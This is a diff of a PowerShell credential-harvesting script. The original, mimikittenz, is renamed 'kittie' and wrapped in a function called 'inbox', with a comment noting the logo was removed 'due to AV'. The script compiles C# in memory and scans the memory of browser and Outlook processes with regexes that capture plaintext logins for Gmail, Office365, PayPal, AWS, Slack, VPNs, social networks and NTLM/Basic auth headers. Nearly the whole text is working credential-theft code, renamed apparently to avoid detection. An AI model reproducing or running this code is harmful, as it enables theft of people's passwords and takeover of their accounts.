@@ -1,12 +1,12 @@
 function inbox
 {
 
+@'
+             
+The kittie is running, logo removed due to AV
+'@
 
-
-$d9Z9jWNkaiqUCse = @"
-4pSA4pSA4pSA4paQ4paA4paE4pSA4pSA4pSA4pSA4pSA4pSA4paE4paA4paM4pSA4pSA4pSA4paE4paE4paE4paE4paE4paE4paE4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQrilIDilIDilIDilozilpLilpLiloDiloTiloTiloTiloTiloDilpLilpLilpDiloTiloDiloDilpLilojilojilpLilojilojilpLiloDiloDiloTilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCuKUgOKUgOKWkOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWgOKWhOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0K4pSA4pSA4paM4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paE4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paA4paE4pSA4pSA4pSA4pSA4pSA4pSADQriloDilojilpLilpLilojilozilpLilpLilojilpLilpLilpDilojilpLilpLiloDilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilozilIDilIDilIDilIDilIANCuKWgOKWjOKWkuKWkuKWkuKWkuKWkuKWgOKWkuKWgOKWkuKWkuKWkuKWkuKWkuKWgOKWgOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKUgOKUgOKUgOKWhOKWhA0K4paQ4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paM4paE4paI4paS4paIDQrilpDilpLilpLilpLilpJtaW1pa2l0dGVuei0xLjAtYWxwaGHilpLilpLilpLilpLilpLilpLilpLilpLilpLilpDilpLilojiloDilIANCuKWkOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKWgOKUgOKUgOKUgA0K4paQ4paS4paS4paS4paS4paS4paSQ0FOIEkgSEFaIFdBTT/ilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilozilIDilIDilIDilIANCuKUgOKWjOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKUgOKUgOKUgOKUgOKUgA0K4pSA4paQ4paS4paS4paSamFtaWVzb25AZHJpbmdlbnNlYy5jb23ilpLilpLilpLilpLilozilIDilIDilIDilIDilIANCuKUgOKUgOKWjOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKUgOKUgOKUgOKUgOKUgOKUgA0K4pSA4pSA4paQ4paE4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paE4paM4pSA4pSA4pSA4pSA4pSA4pSADQrilIDilIDilIDilIDiloDiloTiloTiloDiloDiloDiloDiloTiloTiloDiloDiloDiloDiloDiloDiloTiloTiloDiloDiloDiloDiloDiloDiloTiloTiloDilIDilIDilIDilIDilIDilIDilIDilIA=
-"@
-$rtCzPAj9qMlCXWF = @"
+$Source2 = @"
 using System;
 using System.Collections.Generic;
 using System.Text;
@@ -15,11 +15,11 @@ using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 using System.IO;
 
-namespace mimikittenz
+namespace kittie
 {
-    public class MemProcInspector
+    public class MemoryStrings
     {
-        static MemProcInspector()
+        static MemoryStrings()
         {
             InitRegexes();
         }
@@ -422,94 +422,91 @@ $inmem=New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
  $inmem.GenerateInMemory=1
 $inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Location))))
 
-Add-Type -TypeDefinition $rtCzPAj9qMlCXWF -Language CSharp -CompilerParameters $inmem
+Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
 
-[mimikittenz.MemProcInspector]::regexes.Clear()
-
-
+[kittie.MemoryStrings]::regexes.Clear()
 
 
+    #Gmail
+    [kittie.MemoryStrings]::AddRegex("Gmail","&Email=.{1,99}?&Passwd=.{1,99}?&PersistentCookie=")
+    [kittie.MemoryStrings]::AddRegex("Google Account", "identifier=.{1,50}?&password=.{1,50}")
+
+#Web Services
+
+    #Dropbox
+    [kittie.MemoryStrings]::AddRegex("Dropbox","login_email=.{1,99}&login_password=.{1,99}&")
+    #SalesForce (Needs fix)
+    #[kittie.MemoryStrings]::AddRegex("SalesForce","&display=page&username=.{1,32}&pw=.{1,16}&Login=")
+    #Office365
+    [kittie.MemoryStrings]::AddRegex("Office365","login=.{1,32}&passwd=.{1,22}&PPSX=")
+    [kittie.MemoryStrings]::AddRegex("MicrosoftCloud - Azure","login=.{1,32}?passwd=.{1,22}")
+    #Microsoft OneDrive
+    [kittie.MemoryStrings]::AddRegex("MicrosoftOneDrive","login=.{1,42}&passwd=.{1,22}&type=.{1,2}&PPFT=")
+    #PayPal
+    [kittie.MemoryStrings]::AddRegex("PayPal","login_email=.{1,48}&login_password=.{1,16}&submit=Log\+In&browser_name")
+    #AWS Web Services
+    [kittie.MemoryStrings]::AddRegex("awsWebServices","&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1=")
+    #Outlook Web 2015
+    [kittie.MemoryStrings]::AddRegex("OutlookWeb","&username=.{1,48}&password=.{1,48}&passwordText")
+    #Slack
+    [kittie.MemoryStrings]::AddRegex("Slack","&crumb=.{1,70}&email=.{1,50}&password=.{1,48}")
+    #CitrixOnline
+    [kittie.MemoryStrings]::AddRegex("CitrixOnline","emailAddress=.{1,50}&password=.{1,50}&submit")
+
+#Accounting
+
+    #Xero 
+    [kittie.MemoryStrings]::AddRegex("Xero ","fragment=&userName=.{1,32}&password=.{1,22}&__RequestVerificationToken=")
+    #MYOB
+    [kittie.MemoryStrings]::AddRegex("MYOB","UserName=.{1,50}&Password=.{1,50}&RememberMe=")
+#SSL-VPN's
+
+    #Juniper SSL-VPN
+    [kittie.MemoryStrings]::AddRegex("JuniperSSLVPN","tz_offset=-.{1,6}&username=.{1,22}&password=.{1,22}&realm=.{1,22}&btnSubmit=")
 
 
-    [mimikittenz.MemProcInspector]::AddRegex("Gmail","&Email=.{1,99}?&Passwd=.{1,99}?&PersistentCookie=")
+#Social Media
 
-
-
-
-
-    [mimikittenz.MemProcInspector]::AddRegex("Dropbox","login_email=.{1,99}&login_password=.{1,99}&")
-
-
-
-    [mimikittenz.MemProcInspector]::AddRegex("Office365","login=.{1,32}&passwd=.{1,22}&PPSX=")
-
-    [mimikittenz.MemProcInspector]::AddRegex("MicrosoftOneDrive","login=.{1,42}&passwd=.{1,22}&type=.{1,2}&PPFT=")
-
-    [mimikittenz.MemProcInspector]::AddRegex("PayPal","login_email=.{1,48}&login_password=.{1,16}&submit=Log\+In&browser_name")
-
-    [mimikittenz.MemProcInspector]::AddRegex("awsWebServices","&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1=")
-
-    [mimikittenz.MemProcInspector]::AddRegex("OutlookWeb","&username=.{1,48}&password=.{1,48}&passwordText")
-
-    [mimikittenz.MemProcInspector]::AddRegex("Slack","&crumb=.{1,70}&email=.{1,50}&password=.{1,48}")
-
-    [mimikittenz.MemProcInspector]::AddRegex("CitrixOnline","emailAddress=.{1,50}&password=.{1,50}&submit")
-
-
-
-
-    [mimikittenz.MemProcInspector]::AddRegex("Xero ","fragment=&userName=.{1,32}&password=.{1,22}&__RequestVerificationToken=")
-
-    [mimikittenz.MemProcInspector]::AddRegex("MYOB","UserName=.{1,50}&Password=.{1,50}&RememberMe=")
-
-
-
-    [mimikittenz.MemProcInspector]::AddRegex("JuniperSSLVPN","tz_offset=-.{1,6}&username=.{1,22}&password=.{1,22}&realm=.{1,22}&btnSubmit=")
-
-
-
-
-
-    [mimikittenz.MemProcInspector]::AddRegex("Twitter","username_or_email%5D=.{1,42}&session%5Bpassword%5D=.{1,22}&remember_me=")
-
-    [mimikittenz.MemProcInspector]::AddRegex("Facebook","lsd=.{1,10}&email=.{1,42}&pass=.{1,22}&default_persistent=")
-
-    [mimikittenz.MemProcInspector]::AddRegex("LinkedIN","session_key=.{1,50}&session_password=.{1,50}&isJsEnabled")
+    #Twitter
+    [kittie.MemoryStrings]::AddRegex("Twitter","username_or_email%5D=.{1,42}&session%5Bpassword%5D=.{1,22}&remember_me=")
+    #Facebook
+    [kittie.MemoryStrings]::AddRegex("Facebook","lsd=.{1,10}&email=.{1,42}&pass=.{1,22}&default_persistent=")
+    #LinkedIN
+    [kittie.MemoryStrings]::AddRegex("LinkedIN","session_key=.{1,50}&session_password=.{1,50}&isJsEnabled")
 
 
 
-
-    [mimikittenz.MemProcInspector]::AddRegex("Malwr","&username=.{1,32}&password=.{1,22}&next=")
-
-    [mimikittenz.MemProcInspector]::AddRegex("VirusTotal","password=.{1,22}&username=.{1,42}&next=%2Fen%2F&response_format=json")
-
-    [mimikittenz.MemProcInspector]::AddRegex("AnubisLabs","username=.{1,42}&password=.{1,22}&login=login")
-
-
+    #Malwr
+    [kittie.MemoryStrings]::AddRegex("Malwr","&username=.{1,32}&password=.{1,22}&next=")
+    #VirusTotal
+    [kittie.MemoryStrings]::AddRegex("VirusTotal","password=.{1,22}&username=.{1,42}&next=%2Fen%2F&response_format=json")
+    #AnubisLabs
+    [kittie.MemoryStrings]::AddRegex("AnubisLabs","username=.{1,42}&password=.{1,22}&login=login")
 
 
-    [mimikittenz.MemProcInspector]::AddRegex("CitrixNetScaler","login=.{1,22}&passwd=.{1,42}")
-
-    [mimikittenz.MemProcInspector]::AddRegex("RDPWeb","DomainUserName=.{1,52}&UserPass=.{1,42}&MachineType")
+    [kittie.MemoryStrings]::AddRegex("CitrixNetScaler","login=.{1,22}&passwd=.{1,42}")
+    [kittie.MemoryStrings]::AddRegex("RDPWeb","DomainUserName=.{1,52}&UserPass=.{1,42}&MachineType")
     
 
 
+    [kittie.MemoryStrings]::AddRegex("JIRA","username=.{1,50}&password=.{1,50}&rememberMe")
+    
+    [kittie.MemoryStrings]::AddRegex("Redmine","username=.{1,50}&password=.{1,50}&login=Login")
+    
+    [kittie.MemoryStrings]::AddRegex("Github","%3D%3D&login=.{1,50}&password=.{1,50}")
+    
+    [kittie.MemoryStrings]::AddRegex("BugZilla","Bugzilla_login=.{1,50}&Bugzilla_password=.{1,50}")
+    
+    [kittie.MemoryStrings]::AddRegex("Zendesk","user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}")
+    
+    [kittie.MemoryStrings]::AddRegex("Cpanel","user=.{1,50}&pass=.{1,50}")
+    
+    [kittie.MemoryStrings]::AddRegex("Outlook","Authorization: Basic .{1,100}")
 
+    [kittie.MemoryStrings]::AddRegex("DomainAuth","Authorization: NTLM .{1,125}")
+    
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
+$matchesFound=[kittie.MemoryStrings]::InspectManyProcs("iexplore","chrome","firefox", "outlook", "MicrosoftEdge")
 
-
-    [mimikittenz.MemProcInspector]::AddRegex("JIRA","username=.{1,50}&password=.{1,50}&rememberMe")
-
-    [mimikittenz.MemProcInspector]::AddRegex("Redmine","username=.{1,50}&password=.{1,50}&login=Login")
-
-    [mimikittenz.MemProcInspector]::AddRegex("Github","%3D%3D&login=.{1,50}&password=.{1,50}")
-
-    [mimikittenz.MemProcInspector]::AddRegex("BugZilla","Bugzilla_login=.{1,50}&Bugzilla_password=.{1,50}")
-
-    [mimikittenz.MemProcInspector]::AddRegex("Zendesk","user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}")
-
-    [mimikittenz.MemProcInspector]::AddRegex("Cpanel","user=.{1,50}&pass=.{1,50}")
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($d9Z9jWNkaiqUCse))
-$XGjdngahffJFqFe=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
-
-write-output $XGjdngahffJFqFe
+write-output $matchesFound
 }
